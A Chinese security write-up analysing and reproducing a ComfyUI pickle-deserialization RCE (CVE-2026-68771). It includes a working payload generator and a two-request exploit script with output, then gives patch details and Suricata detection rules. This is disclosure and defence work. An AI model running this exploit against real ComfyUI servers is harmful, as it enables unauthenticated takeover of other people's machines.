---
title: 【先知】ComfyUI 9.3 分反序列化 RCE 实测：官方没当漏洞修的"唯一漏网之鱼"
source: https://xz.aliyun.com/news/92827
source_host: xz.aliyun.com
clip_date: 2026-09-14T13:55:15+08:00
trace_id: 9d8693b9-19eb-4b0d-b443-0a478bfad8cb
content_hash: 05694f855c4b72d2d3a1595f301b5bcb89277cc1f5885e2fc8d72c7b955ae275
status: synced
tags:
  - 先知
  - 漏洞分析
  - AI应用
series: null
feed_source: 先知安全技术社区
ai_summary: ComfyUI 的 LoadTrainingDataset 节点存在 pickle 反序列化 RCE（CVE-2026-68771，CVSS 9.3），两个无认证 HTTP 请求即可拿下服务器，官方却只以"加固"名义修复。
ai_summary_style: key-points
images_status:
  total: 10
  succeeded: 10
  failed_urls: []
notion_page_id: 3db75244-d011-811c-81cb-d5d66dee50af
ioc:
  cves:
    - CVE-2025-67303
    - CVE-2026-68771
  cwes:
    - CWE-502
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> ComfyUI 的 LoadTrainingDataset 节点存在 pickle 反序列化 RCE（CVE-2026-68771，CVSS 9.3），两个无认证 HTTP 请求即可拿下服务器，官方却只以"加固"名义修复。
> 
> - **影响版本：** v0.22.0~v0.25.0 四个正式版均带洞，修复 commit 94ee49b（加 `weights_only=True`）对应 v0.26.0；流传的"0.23.1 已修复"错误，该版本号根本不存在。
> - **根因：** `comfy_extras/nodes_dataset.py` 中一处裸调 `torch.load(f)`，是代码库唯一未传 `weights_only=True` 的调用；torch 2.6+ 默认值已翻转，故复现必须 pin torch 2.5.1。
> - **利用链：** `POST /upload/image` 以 `type=output` + 无扩展名白名单写入 `shard_0000.pkl`，再由 `POST /prompt` 触发节点加载；工作流需接 `PreviewAny` 绕过"必须含输出节点"的图校验。
> - **执行效果：** payload 用 `__reduce__` 返回 `os.system`，命令以 ComfyUI 进程用户身份执行，`/history` 只显示正常完成，无异常痕迹。
> - **防御要点：** 升 v0.26.0+ 并同步 torch 2.6+；8188 端口不裸奔公网、反代加认证；上线侧限制 `type=output`；进程降权；可用 Suricata 规则匹配 pickle 文件上传 + 训练节点触发两个阶段。

> 本文首发实验环境与全部结论均为本人实测。漏洞编号 CVE-2026-68771，影响 ComfyUI v0.22.0 ~ v0.25.0，v0.26.0 修复。所有测试均在本地隔离虚拟机内进行，请勿对未授权目标复现。

## 一、为什么盯上这个洞

玩过本地 AI 绘图的应该都认识 ComfyUI——节点式工作流 Stable Diffusion 前端，GitHub star 数万级别的那种，在本地 AI 绘图圈子里它几乎是标配。但真正让我起意写这篇文章的，是 Cloud Security Alliance 今年三月份的一份报告：Censys 观测到超过一千个暴露在公网的 ComfyUI 实例被挖矿僵尸网络批量打穿，利用的是 ComfyUI-Manager 的另一个洞。整个攻击过程完全自动化，实例上线到被植入挖矿任务只需要很短时间。

也就是说，ComfyUI 的攻击面已经不是"理论上值得关注"，而是有真实的人在批量收割。顺着这个线索，我把 ComfyUI 主仓库最近的 commit 翻了一遍；2026 年 7 月底，VulnCheck 披露了 CVE-2026-68771：ComfyUI 自带的 LoadTrainingDataset 节点反序列化任意代码执行，CVSS 9.3（VulnCheck 评分），无认证利用，两个 HTTP 请求拿下服务器。

两个请求拿下一个 9.3 分，这个描述足够抓眼球，但我更感兴趣的是另一件事：这个洞的修复 commit 官方压根没说这是安全修复，commit message 的措辞是 harden（加固），理由是"新版本 PyTorch 默认已经是 weights_only 了，这里加上只是防御纵深"。翻译一下就是：官方觉得这不是洞，是顺手补一刀。

问题是，真的所有人都用新版 PyTorch 吗？我决定把整个利用链亲手打一遍，顺便把版本考古做扎实——因为搜中文资料的时候我发现，几乎所有转述文章都说"官方已在 0.23.1 修复"，而这句话本身就是错的。

## 二、漏洞信息与版本考古

先把公开信息摆出来。CVE-2026-68771，CWE-502（反序列化不可信数据），GitHub 上有一条自动生成的 advisory（GHSA-6p72-9j26-4rmx，Unreviewed 级别，2026 年 8 月 1 日发布），描述只覆盖 v0.23.0。Comfy-Org 官方自己没有发布过 reviewed 级别的安全公告，这一点后面讨论官方态度时会再提。

**要搞清楚影响范围，得从代码考古做起。** LoadTrainingDataset 这个节点不是 ComfyUI 的老节点，它随 PR #11117（Resolution bucketing and Trainer implementation refactoring，训练器重构）在 2025 年 12 月 18 日合入主干。这次重构把训练数据集按"分辨率分桶"切成一个个分片文件保存，加载时再合并——反序列化就发生在加载这一步。

我逐个版本拉了源码比对（方法很简单：用 GitHub API 查每个 tag 下 `comfy_extras/nodes_dataset.py` 的内容），结论如下：

|     |     |     |
| --- | --- | --- |  
| 版本  | 发布日期 | LoadTrainingDataset 状态 |
| v0.21.x | 2025 年 12 月前 | 节点不存在，不受影响 |
| v0.22.0 | 2026-05-20 | 存在， `torch.load(f)` 裸调，带洞 |
| v0.23.0 | 2026-06-01 | 存在，带洞（实测） |
| v0.24.0 | 2026-06-03 | 存在，带洞 |
| v0.25.0 | 2026-06-16 | 存在，带洞（实测） |
| 修复 commit 94ee49b | 2026-06-18 | 加 `weights_only=True` |
| v0.26.0 | 2026-06-23 | 已修复 |

见下图，整个时间线一目了然。这里要把两个时间尺度分开说：漏洞代码从合入主干到被修复，存在了整整半年（2025-12-18 到 2026-06-18）；但普通用户真正暴露在攻击面下，是从 5 月 20 日 v0.22.0 发布到 6 月 23 日 v0.26.0 修复——五个星期，横跨四个正式 release。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/70909e442ed9a4c0.png)

这里有个值得单独拎出来的事实： **v0.23.1 这个版本根本不存在。** ComfyUI 的版本序列是 v0.23.0 直接跳到 v0.24.0，所以中文社区大量转述的"官方已在 0.23.1 修复"是以讹传讹——写这些文章的人大概率没看过仓库，只是互相抄。而且实际受影响范围比"v0.23.0 及更早"宽得多，四个正式版本都中招，直到 v0.26.0 才真正修复。CVE 数据库的条目同样是模糊的（GHSA 描述只写了 v0.23.0），这类"advisory 版本范围和实际代码状态对不上"的情况，在追 AI 应用漏洞的时候得多留个心眼。

## 三、根因分析：为什么会有一行裸调的 torch.load

### 3.1 漏洞点

漏洞代码在 `comfy_extras/nodes_dataset.py` 。先看数据是怎么来的：配套的 SaveTrainingDataset 节点会把训练数据集切成固定大小的分片，文件名形如 `shard_0000.pkl` ，用 `torch.save` 序列化后存进 output 目录（支持在 `folder_name` 参数里指定子文件夹，传空字符串就是根目录）。LoadTrainingDataset 则是逆操作——从 output 目录找到所有分片，加载、合并、返回给下游节点：

```python
class LoadTrainingDataset(io.ComfyNode):
    @classmethod
    def define_schema(cls):
        return io.Schema(
            node_id="LoadTrainingDataset",
            category="training",
            is_experimental=True,
            inputs=[
                io.String.String("folder_name", default=""),
            ],
            outputs=[io.Latent.Output("latents"), io.Conditioning.Output("conditioning")],
        )

    @classmethod
    def execute(cls, folder_name):
        dataset_dir = os.path.join(folder_paths.get_output_directory(), folder_name)
        # ...
        shard_files = [f for f in os.listdir(dataset_dir)
                       if f.startswith("shard_") and f.endswith(".pkl")]
        # ...
        for shard_file in shard_files:
            shard_path = os.path.join(dataset_dir, shard_file)
            with open(shard_path, "rb") as f:
                shard_data = torch.load(f)   # <-- 漏洞点，v0.23.0 第 1568 行
            all_latents.extend(shard_data["latents"])
            all_conditioning.extend(shard_data["conditioning"])
```

关键就在第 1568 行的 `torch.load(f)` 。接触过 Python 反序列化的读者应该知道， `torch.load` 底层就是 pickle，而 pickle 反序列化时 `__reduce__` 方法返回的 `(callable, args)` 会被直接调用——这是 Python 反序列化武器化最经典的一条路。

### 3.2 "唯一漏网之鱼"是怎么漏的

有意思的是，ComfyUI 的开发团队不是不知道这个风险。修复 commit 94ee49b 的 message 里写得很直白：这是 **整个代码库里唯一一处** 没传 `weights_only=True` 的 `torch.load` 调用。模型加载的核心入口 `comfy/utils.py` 的 `load_torch_file()` 早就传了 `weights_only=True` ，甚至仓库里注释都写着"recent PyTorch defaults to weights_only=True, so this is defense-in-depth"。

为什么偏偏训练数据集这条路径漏了？我的理解是：模型加载路径是所有用户每天都要走的路，出过事、被审计过；而训练数据集是 2025 年底刚加进来的实验功能（节点标记 `is_experimental=True` ），写代码的人可能默认"分片文件是 SaveTrainingDataset 自己存的，格式可信"——典型的信任边界错位：文件放在服务器自己的 output 目录里，不代表放进来的内容就可信。

见下图，正常流程和攻击流程的差异就一条：output 目录里的 `shard_*.pkl` 是否真的由 SaveTrainingDataset 生成。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1f7388b01e6babd3.png)

### 3.3 上传面：怎么把恶意分片送进 output 目录

有了反序列化点还不够，还得能控制 output 目录的内容。ComfyUI 默认开 8188 端口，无认证。文件上传接口 `/upload/image` 我翻了一下 server.py 的实现，有三个关键点：

```python
@routes.post("/upload/image")                        # server.py L450（v0.23.0）
async def upload_image(request):
    post = await request.post()
    return image_upload(post)                        # 上传逻辑都在这里

def image_upload(post, image_save_function=None):    # server.py L385，节选
    image = post.get("image")
    image_upload_type = post.get("type")
    upload_dir, image_upload_type = get_dir_by_type(image_upload_type)  # input / temp / output
    ...
    filename = image.filename
    subfolder = post.get("subfolder", "")
    filepath = os.path.abspath(os.path.join(upload_dir, os.path.normpath(subfolder), filename))
    if os.path.commonpath((upload_dir, filepath)) != upload_dir:        # 防目录穿越，仅此一道
        return web.Response(status=400)
    ...
    # splitext 只用于重名判断——没有任何扩展名白名单，.pkl 原样放行
```

-   `type` 参数支持 `output` ，恶意文件可以直接写进 output 目录，不需要任何其他前置条件；
-   **没有扩展名白名单**，`.pkl` 文件原样落盘；
-   文件名完全可控，取 `shard_0000.pkl` 这样的名字毫无障碍。

上传和反序列化两个点拼起来，攻击链就完整了： `POST /upload/image` 送恶意分片进 output 目录， `POST /prompt` 触发 LoadTrainingDataset 去加载它。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bd8942e8b97541cb.png)

顺带说一句设计层面的问题：ComfyUI 的 API 无认证这件事本身一直在社区里被讨论，2024 年就有用户开 discussion 请求默认开启认证，维护者的回复口径是：不使用 `--listen` 对外监听就相对安全，更稳妥的做法是放进 Docker 之类的沙箱环境——安全责任交还给部署者。这个立场对个人用户勉强成立，但这份挖矿报告里被打穿的恰恰是把 ComfyUI 暴露到公网的人——"默认信任"的设计叠加"暴露面管理缺位"，就是这一千多个实例的现状。

## 四、环境搭建：三个坑

复现环境我放在 VMware 里的 Ubuntu 24.04 虚拟机上（4 核、8G 内存分配、IP 192.168.3.8），只需要一台机器。

### 4.1 版本选择：必须 pin 在 torch 2.5.1

这是整个实验 **最重要的一个前提**。PyTorch 从 2.6 开始把 `torch.load` 的 `weights_only` 默认值从 False 翻转成了 True——也就是说在 torch 2.6+ 的环境里，即使代码没修复，任意对象的反序列化也会被默认拦截。ComfyUI 的 requirements.txt 里 torch 是不带版本号的，2026 年 9 月的今天直接 pip install 会装到 2.7+，payload 打不进去。

所以必须明确装 torch 2.5.1。理论上 CPU 版就够了，但我用清华镜像装的时候镜像把 CUDA 全家桶（约 6GB）一起拉了下来——这台虚拟机磁盘只剩 15G，装完只剩 5G，整个下载安装过程比预想的慢不少。想省空间的读者建议明确走 CPU 版的 index-url，别学我。

```bash
# 关键：torch 2.5.1（2.6+ 默认 weights_only=True，payload 会被拦）
# 依赖统一走清华镜像，国内直连 PyPI 会超时（详见 4.3）
python3 -m venv venv && source venv/bin/activate
pip install torch==2.5.1 torchvision==0.20.1 torchaudio==2.5.1 -i https://pypi.tuna.tsinghua.edu.cn/simple
git clone https://github.com/comfyanonymous/ComfyUI && cd ComfyUI   # 直连被重置的话，改用 4.3 的 codeload 方式
git checkout v0.23.0
pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
python main.py --cpu --port 8188
```

### 4.2 第二个坑：图校验会拒绝"纯利用"工作流

这个坑预验证的时候才发现。ComfyUI 的 `/prompt` 接口在入队前会做图校验，要求工作流里至少有一个输出类节点（SaveImage、PreviewImage 这类）。如果你只提交一个孤零零的 LoadTrainingDataset 节点，会直接收到 `prompt_no_outputs` 拒绝——漏洞节点本身不输出文件，请求根本到不了执行阶段。

绕过很简单：把 LoadTrainingDataset 的 latents 输出接一个 `PreviewAny` 节点（ComfyUI 自带节点，接受任意类型输入且属于输出节点）。这个节点纯粹是给校验器看的，RCE 在 LoadTrainingDataset 执行的那一刻就已经完成了。

### 4.3 第三个坑：GitHub 直连不稳

国内网络环境下虚拟机直连 GitHub clone 会被重置，我是用宿主机下载 codeload 源码包再 scp 进虚拟机的，具体就是取 `https://codeload.github.com/comfyanonymous/ComfyUI/tar.gz/refs/tags/v0.23.0` ，传进虚拟机解压后把目录名改成 ComfyUI，后续命令不变。PyPI 也有同样的问题（ `files.pythonhosted.org` 解析超时），依赖统一走清华镜像最省事。

环境验收标准： `curl http://127.0.0.1:8188/` 返回 200，且 `python -c "import torch; print(torch.__version__)"` 输出 `2.5.1+cu124` 或 `2.5.1` 。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f5ecaa0a56e863b7.png)

## 五、实战复现

### 5.1 构造恶意分片

构造 payload 的思路很直接：一个 `__reduce__` 返回 `(os.system, (cmd,))` 的类，外面套一层和 SaveTrainingDataset 正常输出一致的 dict 结构（ `latents` 和 `conditioning` 两个键）。反序列化发生在 `torch.load` 调用内部， `__reduce__` 在 unpickle 阶段就会执行，根本轮不到节点的后续逻辑报错。

```python
# gen_payload.py
import os
import torch

class RCE:
    def __reduce__(self):
        # 命令硬编码，避免命令行传参被 shell 引号拆散
        return (os.system, ("id > /tmp/pwned 2>&1",))

data = {"latents": [RCE()], "conditioning": []}
torch.save(data, "shard_0000.pkl")
print("[+] payload written: shard_0000.pkl")
```

这里有两个细节值得说。第一，为什么要用真 `torch.save` 打包而不是直接 `pickle.dump` 一个对象就完事—— `torch.load` 在新版本里会先探测文件格式，直接裸 pickle 的文件在部分版本组合下会走异常分支，用 `torch.save` 生成标准 PyTorch zip 格式是最稳的路径，也和真实攻击者的行为一致。第二，命令为什么硬编码在脚本里：我最初通过 SSH 远程执行这段脚本时把命令当参数传，结果 PowerShell 到 SSH 到 bash 三层引号剥离把 `id > /tmp/pwned` 拆散了，实际进 payload 的只有 `id` ，命令执行了，但 marker 文件（提前约定路径的标记文件，用来验证命令真的跑过）没落地，排查了好一会儿——排查的时候反而先看到 `uid=1000(ookini)` 打在了终端上，算是这个坑带来的意外"成功"证明。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b1fbc292476fb078.png)

### 5.2 上传与触发

完整的利用脚本如下。三步：上传、触发、轮询执行状态。

```python
# exploit_chain.py
import sys, time, requests

BASE = f"http://{sys.argv[1]}" if len(sys.argv) > 1 else "http://127.0.0.1:8188"
PAYLOAD = "shard_0000.pkl"

# 1) 上传: type=output 直写 output 目录, 无扩展名校验
with open(PAYLOAD, "rb") as f:
    r = requests.post(
        f"{BASE}/upload/image",
        files={"image": (PAYLOAD, f, "application/octet-stream")},
        data={"type": "output", "overwrite": "true"},
    )
print("[1] upload:", r.status_code, r.text.strip())

# 2) 触发: folder_name 为空 -> 直接枚举 output 根目录
#    PreviewAny 仅用于满足"工作流必须含输出节点"的图校验
workflow = {
    "prompt": {
        "42": {
            "class_type": "LoadTrainingDataset",
            "inputs": {"folder_name": ""},
        },
        "43": {
            "class_type": "PreviewAny",
            "inputs": {"source": ["42", 0]},
        },
    },
    "client_id": "poc",
}
r = requests.post(f"{BASE}/prompt", json=workflow)
print("[2] prompt:", r.status_code, r.text.strip())
prompt_id = r.json().get("prompt_id", "")

# 3) 轮询执行结果
for _ in range(20):
    time.sleep(0.5)
    h = requests.get(f"{BASE}/history/{prompt_id}").json()
    if prompt_id in h:
        st = h[prompt_id]["status"]
        print("[3] status:", st.get("status_str"), "| completed:", st.get("completed"))
        break
```

逐个说关键点。上传这一步用 `multipart/form-data` ， `image` 字段放文件内容， `type=output` 让 ComfyUI 把文件写进 output 目录。触发这一步， `folder_name` 传空字符串时 `os.path.join(output_dir, "")` 就是 output 目录本身，节点会枚举到我们上传的 `shard_0000.pkl` （ `startswith("shard_")` 且 `endswith(".pkl")` 两个条件都满足）。

跑起来的输出长这样：

```latex
[1] upload: 200 {"name": "shard_0000.pkl", "subfolder": "", "type": "output"}
[2] prompt: 200 {"prompt_id": "b3ff8239-...", "number": 3, "node_errors": {}}
[3] status: success | completed: True
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/122dffbb3a33b127.png)

`/prompt` 返回 200 且 status 是 success——注意这里连报错都没有，节点逻辑跑得干干净净，因为 `os.system` 的返回值（int）被顺利 extend 进了 latents 列表，整个反序列化过程在 ComfyUI 看来是一次"正常的训练数据集加载"。 `/history` 接口的响应里也只有一个正常完成的节点执行记录，没有任何异常痕迹。换个角度说，如果受害者事后只看 ComfyUI 的界面和执行历史，什么都不会发现——命令执行的副作用完全发生在 HTTP 响应之外，这也是无文件落地 payload（比如直接反弹 shell）在这个场景里更隐蔽的原因。

验证命令执行结果：

```latex
$ cat /tmp/pwned
uid=1000(ookini) gid=1000(ookini) 组=1000(ookini),4(adm),24(cdrom),27(sudo),...
```

marker 文件内容是 `id` 命令的输出，执行身份就是 ComfyUI 进程的运行用户。两个 HTTP 请求，无认证，RCE 落地。顺带留意组列表里有个 `docker` 组——很多人图省事直接用日常用户跑 ComfyUI，进程继承的就是这种全量组权限，拿下它离拿下宿主机控制权只差一步，这也是后面防御部分要把"运行时降权"单独列一层的原因。实际攻击场景里，这一步换成反弹 shell、写 crontab、下载挖矿二进制都只是 payload 字符串的事。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f41ddc3fa3834fec.png)

还有一个我读代码时注意到的点，顺手记录，写入侧和读取侧要分开看：写入侧 `type` 参数本身就支持 `input` / `temp` / `output` 三个目录，把恶意分片传进 input 目录不需要任何穿越；而读取侧 `folder_name` 的基准固定是 output 目录，且没有做任何路径清洗，传 `../input` 就能穿到 input 目录去加载。两边拼起来意味着：即使未来官方把 `type=output` 这个上传路径收紧了，只要 `torch.load` 不修，攻击者手里还有"传到别的目录 + folder_name 穿越"这条备用路线。这次实测里 `type=output` 直写 output 目录已经足够，我没有再去验证穿越这条线，但这个"同一接口上的冗余攻击面"现象值得记一笔。

### 5.3 对照组：weights_only=True 的拦截效果

修复版本用的就是加 `weights_only=True` ，我把同一份 payload 在这个参数下再跑一遍做对照：

```python
import torch

# 对照读取的是上传后落在服务器 output 目录里的那份分片
with open("/home/ookini/comfyui-vuln/output/shard_0000.pkl", "rb") as f:
    torch.load(f, weights_only=True)
```

结果是被直接拒绝，抛出 `UnpicklingError` ，提示 `Weights only load failed` ——weights_only 模式下 Unpickler 只允许还原 tensor 和基本类型， `os.system` 这种全局函数引用进不了白名单，反序列化在还原阶段就中断了。命令没有执行，marker 文件也不存在。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/873d81ee001895ed.png)

见下图，torch 2.5 和 2.6 的行为差异是理解这个漏洞威胁模型的关键：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6142c98c8cd5ba11.png)

## 六、防御视角与官方态度

### 6.1 那一行修复

修复本身非常克制，就是漏洞点的参数补全：

```diff
--- a/comfy_extras/nodes_dataset.py
+++ b/comfy_extras/nodes_dataset.py
@@ ... @@
             shard_path = os.path.join(dataset_dir, shard_file)
             with open(shard_path, "rb") as f:
-                shard_data = torch.load(f)
+                shard_data = torch.load(f, weights_only=True)
```

配合修复 commit message 的措辞（harden / defense-in-depth，即"加固 / 防御纵深"），可以比较确定地说： **官方没有把这个当安全漏洞处理**。没有 CVE 的官方关联声明，没有 reviewed 级别的 GitHub advisory，PR #14543 走的是普通代码加固流程。从维护者视角这个选择有一定道理——新 torch 默认值翻转后，这段代码在"标准安装"下确实打不动了。但这个理由有个隐含假设：用户跑的是新版 torch。

现实是 pin 在 torch 2.5.x 及以下的 ComfyUI 用户量大得惊人。原因不难理解：大量自定义节点和教程明确要求特定 torch 版本，ComfyUI 生态里"升级 torch = 全家节点重测"是个劝退成本很高的操作。安全默认值翻转是 PyTorch 做的努力，但从默认值翻转到生态真正迁移完成之间，有一段很长的窗口期——这段窗口期里，"官方认为不是洞"和"实际可被利用"同时成立。Censys 看到的那些挖矿实例，就是这个矛盾的注脚。

### 6.2 部署侧能做什么

见下图，按纵深层次过一遍：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9c7dcdb63d8bbd38.png)

-   **升级路径**：直接升 v0.26.0+（核心修复），同时把 torch 升到 2.6+（默认值兜底）。两件事最好都做，因为类似这次"唯一漏网之鱼"的情况完全可能再出现——代码修复依赖开发者自觉，运行时默认值是全局兜底。
-   **网络边界**：8188 端口绝不裸奔公网。远程使用走带认证的反向代理，或者至少加防火墙白名单。挖矿活动的受害者几乎全是裸奔实例。
-   **上传面收敛**：如果没有训练相关需求， `/upload/image` 的 `type=output` 路径基本没有正常业务价值，可以在反代层限制。
-   **检测**：这套攻击在 HTTP 层的特征很明显——POST `/upload/image` 的 multipart 里携带非图片扩展名（`.pkl` /`.pth` /`.ckpt` ）的 part，紧接着 POST `/prompt` 引用 `LoadTrainingDataset` 或其他训练类节点。Suricata 或 Nginx 日志侧都能比较低成本地覆盖。我自己之前用 Suricata（开源网络入侵检测系统，底层就是抓包匹配规则）做过 LLM API 流量检测，顺手写了两条示例规则（Suricata 8 语法，部署前请按实际环境测试）：

```latex
alert http $EXTERNAL_NET any -> $HOME_NET 8188 (msg:"ComfyUI upload of pickle file (possible CVE-2026-68771 stage 1)"; http.method; content:"POST"; http.uri; content:"/upload/image"; http.request_body; content:"filename="; nocase; pcre:"/filename=\"[^\"]*\.(pkl|pth|ckpt|pt)\"/i"; sid:202606871; rev:1;)

alert http $EXTERNAL_NET any -> $HOME_NET 8188 (msg:"ComfyUI LoadTrainingDataset trigger (possible CVE-2026-68771 stage 2)"; http.method; content:"POST"; http.uri; content:"/prompt"; http.request_body; content:"LoadTrainingDataset"; sid:202606872; rev:1;)
```

两条规则分别对应利用链的两个阶段：分片上传和节点触发。第一阶段是通用检测（任何 pickle 类文件上传都值得警惕），第二阶段则特异性很强——正常业务里训练节点的调用频率极低，命中即告警基本没有误报负担。需要提醒的是，这两条规则看的是已发生的攻击行为，属于"最后一道网"，前置的边界收敛（公网不暴露、反代加认证）才是收益更高的部分。

-   **运行时**：对自托管 AI 服务做进程降权（专用低权限用户跑 ComfyUI），这次实验里 marker 文件的 uid 就是进程 uid——进程权限决定了 RCE 的实际破坏半径。

## 七、写在最后

这个洞复现下来，让我印象最深的不是攻击本身——两个请求的利用链，技术含量在 pickle 武器化这个"老手艺"面前几乎为零——而是整条故事线里的信息噪音。

VulnCheck 披露时标的影响版本是 "ComfyUI <= 0.23.0"，我实测发现 v0.24.0、v0.25.0 同样带洞；中文自媒体说 "0.23.1 修复"，而这个版本号根本不存在；官方说这是加固不是修复；PyTorch 说 2.6 起默认安全了，但生态还 pin 在老版本上。四条信息放在一起，单独信任何一条都会得出错误的结论，只有把代码一个版本一个版本翻过去，才知道真相是：带洞代码在主干上存活了半年，随 release 暴露给用户的窗口是五个星期、四个版本，v0.26.0 才真正修复。做漏洞分析这件事，二手信息的折损比我想象的大得多。

另一个值得记录的观察是 `torch.load` 这个老问题的长尾效应。我之前写模型供应链投毒的文章时处理过 picklescan 对老版本 torch 格式的绕过，这次又看到 ComfyUI 在自家代码库的角落里留了一处裸调——同一个反序列化原语，在不同的产品里以不同的形态反复出现。AI 应用栈里，"文件被当作数据加载"的场景（模型、分片、工作流、缓存）远比传统 Web 多，而其中很多路径的信任假设，和传统 Web 时代序列化漏洞的教科书结论并没有本质区别。所谓 AI 安全的新问题，有很大一部分其实是老问题在新地形上的重新落位。

最后想对比一下这个洞和三月份挖矿活动用的 ComfyUI-Manager 洞（CVE-2025-67303）的差别。Manager 是可选扩展，装没装、装什么版本，用户之间差异很大；而 LoadTrainingDataset 是主仓库自带的节点，升级到 v0.22.0 之后的每一个用户都默认拥有这个攻击面，不需要任何额外安装。这也解释了为什么"主仓库自带功能的漏洞"比"扩展漏洞"更值得优先盯——它的影响面是内置的、无差别的。对做防御的人来说，这意味着如果你们环境里有 ComfyUI，光管住 Manager 是不够的，主仓库版本要单独核对。

本文全部实验在本地隔离环境完成，利用脚本和环境搭建命令已在文中给出，复现请遵守法律法规，仅用于授权测试与防御研究。

## 参考文献

1.  VulnCheck，《ComfyUI Unauthenticated RCE via LoadTrainingDataset Pickle Deserialization》， `https://www.vulncheck.com/advisories/comfyui-unauthenticated-rce-via-loadtrainingdataset-pickle-deserialization`
2.  GitHub Advisory Database，《GHSA-6p72-9j26-4rmx》， `https://github.com/advisories/GHSA-6p72-9j26-4rmx`
3.  NVD，《CVE-2026-68771 Detail》， `https://nvd.nist.gov/vuln/detail/CVE-2026-68771`
4.  Comfy-Org，《ComfyUI fix commit 94ee49b》， `https://github.com/Comfy-Org/ComfyUI/commit/94ee49b1612824366a8631ea069b2a1fa5c73720`
5.  Comfy-Org，《PR #11117: Resolution bucketing and Trainer implementation refactoring》， `https://github.com/Comfy-Org/ComfyUI/pull/11117`
6.  PyTorch，《PyTorch 2.6 Release Notes（weights_only 默认值翻转）》， `https://github.com/pytorch/pytorch/releases/tag/v2.6.0`
7.  Cloud Security Alliance，《AI Inference Under Siege: The ComfyUI Cryptomining Botnet》， `https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-workload-exposure-cryptomining-20260408/`
8.  Comfy-Org，《ComfyUI v0.26.0 Release》， `https://github.com/Comfy-Org/ComfyUI/releases/tag/v0.26.0`
9.  什么值得买社区，《CVE-2026-68771：ComfyUI 反序列化漏洞相关转述》， `https://www.smzdm.com/p/33056000/`
10.  什么值得买社区，《ComfyUI 被曝 9.3 分严重漏洞，云端部署者当心，代码执行风险已曝光》（同样转述"0.23.1 修复"）， `https://post.m.smzdm.com/p/avgr0gg4/`
11.  comfyanonymous，《ComfyUI discussion #5165：请求默认开启认证的社区讨论（维护者回复：安全责任在部署侧）》， `https://github.com/comfyanonymous/ComfyUI/discussions/5165`
